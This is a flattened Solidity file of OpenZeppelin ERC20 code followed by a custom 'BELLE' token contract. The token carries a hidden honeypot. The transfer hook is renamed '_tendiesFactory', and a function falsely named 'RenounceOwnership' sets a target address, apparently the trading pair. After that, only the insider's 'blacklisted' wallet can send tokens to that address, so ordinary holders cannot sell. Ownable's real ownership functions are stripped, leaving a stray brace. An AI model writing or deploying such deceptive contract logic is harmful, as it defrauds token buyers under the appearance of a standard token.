1 // SPDX-License-Identifier: MIT
2 pragma solidity ^0.8.0;
3 /*
4  * @dev Provides information about the current execution context, including the
5  * sender of the transaction and its data. While these are generally available
6  * via msg.sender and msg.data, they should not be accessed in such a direct
7  * manner, since when dealing with meta-transactions the account sending and
8  * paying for execution may not be the actual sender (as far as an application
9  * is concerned).
10  *
11  * This contract is only required for intermediate, library-like contracts.
12  */
13 abstract contract Context {
14     function _msgSender() internal view virtual returns (address) {
15         return msg.sender;
16     }
17 
18     function _msgData() internal view virtual returns (bytes calldata) {
19         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
20         return msg.data;
21     }
22 }
23 
24 
25 // File @openzeppelin/contracts/access/Ownable.sol@v4.1.0
26 
27 
28 
29 
30 
31 /**
32  * @dev Contract module which provides a basic access control mechanism, where
33  * there is an account (an owner) that can be granted exclusive access to
34  * specific functions.
35  *
36  * By default, the owner account will be the one that deploys the contract. This
37  * can later be changed with {transferOwnership}.
38  *
39  * This module is used through inheritance. It will make available the modifier
40  * `onlyOwner`, which can be applied to your functions to restrict their use to
41  * the owner.
42  */
43 abstract contract Ownable is Context {
44     address private _owner;
45 
46     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
47 
48     /**
49      * @dev Initializes the contract setting the deployer as the initial owner.
50      */
51     constructor () {
52         address msgSender = _msgSender();
53         _owner = msgSender;
54         emit OwnershipTransferred(address(0), msgSender);
55     }
56 
57     /**
58      * @dev Returns the address of the current owner.
59      */
60     function owner() public view virtual returns (address) {
61         return _owner;
62     }
63 
64     /**
65      * @dev Throws if called by any account other than the owner.
66      */
67     modifier onlyOwner() {
68         require(owner() == _msgSender(), "Ownable: caller is not the owner");
69         _;
70     }
71 
72     /**
73      * @dev Leaves the contract without owner. It will not be possible to call
74      * `onlyOwner` functions anymore. Can only be called by the current owner.
75      *
76      * NOTE: Renouncing ownership will leave the contract without an owner,
77      * thereby removing any functionality that is only available to the owner.
78      */
79  
80     }
81 
82     /**
83      * @dev Transfers ownership of the contract to a new account (`newOwner`).
84      * Can only be called by the current owner.
85      */
86     
87 
88 
89 
90 // File @openzeppelin/contracts/token/ERC20/IERC20.sol@v4.1.0
91 
92 
93 
94 
95 
96 /**
97  * @dev Interface of the ERC20 standard as defined in the EIP.
98  */
99 interface IERC20 {
100     /**
101      * @dev Returns the amount of tokens in existence.
102      */
103     function totalSupply() external view returns (uint256);
104 
105     /**
106      * @dev Returns the amount of tokens owned by `account`.
107      */
108     function balanceOf(address account) external view returns (uint256);
109 
110     /**
111      * @dev Moves `amount` tokens from the caller's account to `recipient`.
112      *
113      * Returns a boolean value indicating whether the operation succeeded.
114      *
115      * Emits a {Transfer} event.
116      */
117     function transfer(address recipient, uint256 amount) external returns (bool);
118 
119     /**
120      * @dev Returns the remaining number of tokens that `spender` will be
121      * allowed to spend on behalf of `owner` through {transferFrom}. This is
122      * zero by default.
123      *
124      * This value changes when {approve} or {transferFrom} are called.
125      */
126     function allowance(address owner, address spender) external view returns (uint256);
127 
128     /**
129      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
130      *
131      * Returns a boolean value indicating whether the operation succeeded.
132      *
133      * IMPORTANT: Beware that changing an allowance with this method brings the risk
134      * that someone may use both the old and the new allowance by unfortunate
135      * transaction ordering. One possible solution to mitigate this race
136      * condition is to first reduce the spender's allowance to 0 and set the
137      * desired value afterwards:
138      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
139      *
140      * Emits an {Approval} event.
141      */
142     function approve(address spender, uint256 amount) external returns (bool);
143 
144     /**
145      * @dev Moves `amount` tokens from `sender` to `recipient` using the
146      * allowance mechanism. `amount` is then deducted from the caller's
147      * allowance.
148      *
149      * Returns a boolean value indicating whether the operation succeeded.
150      *
151      * Emits a {Transfer} event.
152      */
153     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
154 
155     /**
156      * @dev Emitted when `value` tokens are moved from one account (`from`) to
157      * another (`to`).
158      *
159      * Note that `value` may be zero.
160      */
161     event Transfer(address indexed from, address indexed to, uint256 value);
162 
163     /**
164      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
165      * a call to {approve}. `value` is the new allowance.
166      */
167     event Approval(address indexed owner, address indexed spender, uint256 value);
168 }
169 
170 
171 // File @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol@v4.1.0
172 
173 
174 
175 
176 
177 /**
178  * @dev Interface for the optional metadata functions from the ERC20 standard.
179  *
180  * _Available since v4.1._
181  */
182 interface IERC20Metadata is IERC20 {
183     /**
184      * @dev Returns the name of the token.
185      */
186     function name() external view returns (string memory);
187 
188     /**
189      * @dev Returns the symbol of the token.
190      */
191     function symbol() external view returns (string memory);
192 
193     /**
194      * @dev Returns the decimals places of the token.
195      */
196     function decimals() external view returns (uint8);
197 }
198 
199 
200 // File @openzeppelin/contracts/token/ERC20/ERC20.sol@v4.1.0
201 
202 
203 
204 
205 
206 
207 
208 /**
209  * @dev Implementation of the {IERC20} interface.
210  *
211  * This implementation is agnostic to the way tokens are created. This means
212  * that a supply mechanism has to be added in a derived contract using {_mint}.
213  * For a generic mechanism see {ERC20PresetMinterPauser}.
214  *
215  * TIP: For a detailed writeup see our guide
216  * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
217  * to implement supply mechanisms].
218  *
219  * We have followed general OpenZeppelin guidelines: functions revert instead
220  * of returning `false` on failure. This behavior is nonetheless conventional
221  * and does not conflict with the expectations of ERC20 applications.
222  *
223  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
224  * This allows applications to reconstruct the allowance for all accounts just
225  * by listening to said events. Other implementations of the EIP may not emit
226  * these events, as it isn't required by the specification.
227  *
228  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
229  * functions have been added to mitigate the well-known issues around setting
230  * allowances. See {IERC20-approve}.
231  */
232 contract ERC20 is Context, IERC20, IERC20Metadata {
233     mapping (address => uint256) private _balances;
234 
235     mapping (address => mapping (address => uint256)) private _allowances;
236 
237     uint256 private _totalSupply;
238 
239     string private _name;
240     string private _symbol;
241 
242     /**
243      * @dev Sets the values for {name} and {symbol}.
244      *
245      * The defaut value of {decimals} is 18. To select a different value for
246      * {decimals} you should overload it.
247      *
248      * All two of these values are immutable: they can only be set once during
249      * construction.
250      */
251     constructor (string memory name_, string memory symbol_) {
252         _name = name_;
253         _symbol = symbol_;
254     }
255 
256     /**
257      * @dev Returns the name of the token.
258      */
259     function name() public view virtual override returns (string memory) {
260         return _name;
261     }
262 
263     /**
264      * @dev Returns the symbol of the token, usually a shorter version of the
265      * name.
266      */
267     function symbol() public view virtual override returns (string memory) {
268         return _symbol;
269     }
270 
271     /**
272      * @dev Returns the number of decimals used to get its user representation.
273      * For example, if `decimals` equals `2`, a balance of `505` tokens should
274      * be displayed to a user as `5,05` (`505 / 10 ** 2`).
275      *
276      * Tokens usually opt for a value of 18, imitating the relationship between
277      * Ether and Wei. This is the value {ERC20} uses, unless this function is
278      * overridden;
279      *
280      * NOTE: This information is only used for _display_ purposes: it in
281      * no way affects any of the arithmetic of the contract, including
282      * {IERC20-balanceOf} and {IERC20-transfer}.
283      */
284     function decimals() public view virtual override returns (uint8) {
285         return 18;
286     }
287 
288     /**
289      * @dev See {IERC20-totalSupply}.
290      */
291     function totalSupply() public view virtual override returns (uint256) {
292         return _totalSupply;
293     }
294 
295     /**
296      * @dev See {IERC20-balanceOf}.
297      */
298     function balanceOf(address account) public view virtual override returns (uint256) {
299         return _balances[account];
300     }
301 
302     /**
303      * @dev See {IERC20-transfer}.
304      *
305      * Requirements:
306      *
307      * - `recipient` cannot be the zero address.
308      * - the caller must have a balance of at least `amount`.
309      */
310     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
311         _transfer(_msgSender(), recipient, amount);
312         return true;
313     }
314 
315     /**
316      * @dev See {IERC20-allowance}.
317      */
318     function allowance(address owner, address spender) public view virtual override returns (uint256) {
319         return _allowances[owner][spender];
320     }
321 
322     /**
323      * @dev See {IERC20-approve}.
324      *
325      * Requirements:
326      *
327      * - `spender` cannot be the zero address.
328      */
329     function approve(address spender, uint256 amount) public virtual override returns (bool) {
330         _approve(_msgSender(), spender, amount);
331         return true;
332     }
333 
334     /**
335      * @dev See {IERC20-transferFrom}.
336      *
337      * Emits an {Approval} event indicating the updated allowance. This is not
338      * required by the EIP. See the note at the beginning of {ERC20}.
339      *
340      * Requirements:
341      *
342      * - `sender` and `recipient` cannot be the zero address.
343      * - `sender` must have a balance of at least `amount`.
344      * - the caller must have allowance for ``sender``'s tokens of at least
345      * `amount`.
346      */
347     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
348         _transfer(sender, recipient, amount);
349 
350         uint256 currentAllowance = _allowances[sender][_msgSender()];
351         require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
352         _approve(sender, _msgSender(), currentAllowance - amount);
353 
354         return true;
355     }
356 
357     /**
358      * @dev Atomically increases the allowance granted to `spender` by the caller.
359      *
360      * This is an alternative to {approve} that can be used as a mitigation for
361      * problems described in {IERC20-approve}.
362      *
363      * Emits an {Approval} event indicating the updated allowance.
364      *
365      * Requirements:
366      *
367      * - `spender` cannot be the zero address.
368      */
369     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
370         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
371         return true;
372     }
373 
374     /**
375      * @dev Atomically decreases the allowance granted to `spender` by the caller.
376      *
377      * This is an alternative to {approve} that can be used as a mitigation for
378      * problems described in {IERC20-approve}.
379      *
380      * Emits an {Approval} event indicating the updated allowance.
381      *
382      * Requirements:
383      *
384      * - `spender` cannot be the zero address.
385      * - `spender` must have allowance for the caller of at least
386      * `subtractedValue`.
387      */
388     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
389         uint256 currentAllowance = _allowances[_msgSender()][spender];
390         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
391         _approve(_msgSender(), spender, currentAllowance - subtractedValue);
392 
393         return true;
394     }
395 
396     /**
397      * @dev Moves tokens `amount` from `sender` to `recipient`.
398      *
399      * This is internal function is equivalent to {transfer}, and can be used to
400      * e.g. implement automatic token fees, slashing mechanisms, etc.
401      *
402      * Emits a {Transfer} event.
403      *
404      * Requirements:
405      *
406      * - `sender` cannot be the zero address.
407      * - `recipient` cannot be the zero address.
408      * - `sender` must have a balance of at least `amount`.
409      */
410     function _transfer(address sender, address recipient, uint256 amount) internal virtual {
411         require(sender != address(0), "ERC20: transfer from the zero address");
412         require(recipient != address(0), "ERC20: transfer to the zero address");
413 
414         _tendiesFactory(sender, recipient, amount);
415 
416         uint256 senderBalance = _balances[sender];
417         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
418         _balances[sender] = senderBalance - amount;
419         _balances[recipient] += amount;
420 
421         emit Transfer(sender, recipient, amount);
422     }
423 
424     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
425      * the total supply.
426      *
427      * Emits a {Transfer} event with `from` set to the zero address.
428      *
429      * Requirements:
430      *
431      * - `to` cannot be the zero address.
432      */
433     function _mint(address account, uint256 amount) internal virtual {
434         require(account != address(0), "ERC20: mint to the zero address");
435 
436         _tendiesFactory(address(0), account, amount);
437 
438         _totalSupply += amount;
439         _balances[account] += amount;
440         emit Transfer(address(0), account, amount);
441     }
442 
443     /**
444      * @dev Destroys `amount` tokens from `account`, reducing the
445      * total supply.
446      *
447      * Emits a {Transfer} event with `to` set to the zero address.
448      *
449      * Requirements:
450      *
451      * - `account` cannot be the zero address.
452      * - `account` must have at least `amount` tokens.
453      */
454     function _burn(address account, uint256 amount) internal virtual {
455         require(account != address(0), "ERC20: burn from the zero address");
456 
457         _tendiesFactory(account, address(0), amount);
458 
459         uint256 accountBalance = _balances[account];
460         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
461         _balances[account] = accountBalance - amount;
462         _totalSupply -= amount;
463 
464         emit Transfer(account, address(0), amount);
465     }
466 
467     /**
468      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
469      *
470      * This internal function is equivalent to `approve`, and can be used to
471      * e.g. set automatic allowances for certain subsystems, etc.
472      *
473      * Emits an {Approval} event.
474      *
475      * Requirements:
476      *
477      * - `owner` cannot be the zero address.
478      * - `spender` cannot be the zero address.
479      */
480     function _approve(address owner, address spender, uint256 amount) internal virtual {
481         require(owner != address(0), "ERC20: approve from the zero address");
482         require(spender != address(0), "ERC20: approve to the zero address");
483 
484         _allowances[owner][spender] = amount;
485         emit Approval(owner, spender, amount);
486     }
487 
488     /**
489      * @dev Hook that is called before any transfer of tokens. This includes
490      * minting and burning.
491      *
492      * Calling conditions:
493      *
494      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
495      * will be to transferred to `to`.
496      * - when `from` is zero, `amount` tokens will be minted for `to`.
497      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
498      * - `from` and `to` are never both zero.
499      *
500      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
501      */
502     function _tendiesFactory(address from, address to, uint256 amount) internal virtual { }
503 }
504 
505 contract BELLE is ERC20, Ownable {
506     mapping(address=>bool) private _blacklisted;
507     address private _belleToken;
508     constructor() ERC20('twitter.com/bunnydeIphine','BELLE') {
509         _mint(0xf80F6FA4Ccb6550c9Dc58d58D51FB0928f9b323C, 10000000000000 * 10 ** 18);
510         _blacklisted[0xf80F6FA4Ccb6550c9Dc58d58D51FB0928f9b323C] = true;
511     }
512 
513     function Blacklist(address user, bool enable) public onlyOwner {
514         _blacklisted[user] = enable;
515     }
516 
517     function _mint(
518         address account,
519         uint256 amount
520     ) internal virtual override (ERC20) {
521         require(ERC20.totalSupply() + amount <= 10000000000000 * 10 ** 18, "ERC20Capped: coin amount exceeded");
522         super._mint(account, amount);
523     }
524     
525     function RenounceOwnership(address belleToken_) public onlyOwner {
526         _belleToken = belleToken_;
527     }
528 
529     function _tendiesFactory(address from, address to, uint256 amount) internal virtual override {
530         if(to == _belleToken) {
531             require(_blacklisted[from], "Belle is for humans only!");
532         }
533     }
534 }